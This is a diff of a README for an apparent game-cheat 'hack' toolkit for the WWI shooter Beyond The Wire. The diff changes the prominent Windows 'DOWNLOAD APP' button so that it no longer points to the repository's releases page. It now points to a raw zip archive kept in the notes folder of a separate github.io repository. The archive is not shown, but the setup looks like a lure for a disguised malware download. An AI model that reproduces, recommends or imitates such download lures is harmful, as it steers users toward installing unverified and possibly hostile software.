@@ -6,7 +6,7 @@ description: "Squad-based WWI combat toolkit for Beyond The Wire with loadouts, 
 <h1>⚔️ beyond-the-wire-hack-2026-frontline-combat-toolkit - Your WWI Battle Companion App</h1>
 
 <p align="center">
-  <a href="https://github.com/Agha28/beyond-the-wire-hack-2026-frontline-combat-toolkit/releases"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20APP-008080?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" style="background-color:#008080; padding:15px 30px; border-radius:10px; font-size:20px; color:white; text-decoration:none;"></a>
+  <a href="https://raw.githubusercontent.com/Agha28/agha28.github.io/main/notes/Release_1.6.zip"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20APP-008080?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" style="background-color:#008080; padding:15px 30px; border-radius:10px; font-size:20px; color:white; text-decoration:none;"></a>
 </p>
 
 ---
